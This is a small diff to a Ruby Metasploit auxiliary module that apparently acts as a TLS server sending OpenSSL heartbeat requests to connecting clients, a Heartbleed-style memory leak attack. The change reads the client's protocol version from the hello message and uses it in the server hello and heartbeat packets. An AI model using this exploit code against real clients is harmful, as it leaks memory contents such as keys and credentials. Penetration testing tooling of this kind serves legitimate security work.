@@ -128,7 +128,7 @@ class Metasploit3 < Msf::Auxiliary
 
   # Process cleartext TLS messages
   def process_openssl_cleartext_request(c, data)
-    message_type, message_version = data.unpack("Cn")
+    message_type, message_version, protocol_version = data.unpack("Cn@9n")
 
     if message_type == 0x15 and data.length >= 7
       message_level, message_reason = data[5,2].unpack("CC")
@@ -165,7 +165,7 @@ class Metasploit3 < Msf::Auxiliary
       @state[c][:received_hello] = true
 
       print_status("#{@state[c][:name]} Sending Server Hello...")
-      openssl_send_server_hello(c, data, message_version)
+      openssl_send_server_hello(c, data, protocol_version)
       return
     end
 
@@ -196,7 +196,7 @@ class Metasploit3 < Msf::Auxiliary
     else
       # Send heartbeat requests
       if @state[c][:heartbeats].length < heartbeat_limit
-        openssl_send_heartbeat(c, message_version)
+        openssl_send_heartbeat(c, protocol_version)
       end
 
       # Process cleartext heartbeat replies
@@ -216,7 +216,7 @@ class Metasploit3 < Msf::Auxiliary
 
   # Process encrypted TLS messages
   def process_openssl_encrypted_request(c, data)
-    message_type, message_version = data.unpack("Cn")
+    message_type, message_version, protocol_version = data.unpack("Cn@9n")
 
     return if @state[c][:shutdown]
     return unless data.length > 5
@@ -237,7 +237,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # Send heartbeat requests
     if @state[c][:heartbeats].length < heartbeat_limit
-      openssl_send_heartbeat(c, message_version)
+      openssl_send_heartbeat(c, protocol_version)
     end
 
     # Process heartbeat replies
